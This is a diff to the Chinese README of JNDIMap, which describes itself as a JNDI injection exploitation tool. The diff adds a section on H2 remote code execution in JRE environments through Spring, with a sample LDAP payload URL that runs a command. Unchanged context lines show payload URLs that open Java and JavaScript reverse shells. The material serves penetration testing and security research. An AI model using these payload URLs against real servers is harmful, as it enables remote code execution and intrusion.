@@ -1,6 +1,6 @@
 # JNDIMap
 
-[English](README-en.md)
+简体中文 | [English](README.en.md)
 
 JNDIMap 是一个 JNDI 注入利用工具, 支持 RMI, LDAP 和 LDAPS 协议, 包含多种高版本 JDK 绕过方式
 
@@ -260,6 +260,15 @@ ldap://127.0.0.1:1389/Factory/H2/Java/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Factory/H2/JavaScript/ReverseShell/127.0.0.1/4444
 ```
 
+此外, JNDIMap 还支持**JRE 环境**的 H2 RCE (基于 ClassPathXmlApplicationContext, 需要 Spring 依赖)
+
+*Java 15 及以上版本删除了 Nashorn JS 引擎, 同时 JRE 环境本身不包含 javac 命令, 因此无法使用上述 Java/JavaScript 方式实现 RCE*
+
+```bash
+# JRE 命令执行
+ldap://127.0.0.1:1389/Factory/H2/JRE/Spring/Command/open -a Calculator
+```
+
 #### Derby
 
 **Derby SQL RCE**
@@ -495,3 +504,5 @@ java -jar JNDIMap.jar -useReferenceOnly
 [https://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/](https://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/)
 
 [https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html](https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html)
+
+[https://exp10it.io/2025/03/h2-rce-in-jre-17/](https://exp10it.io/2025/03/h2-rce-in-jre-17/)
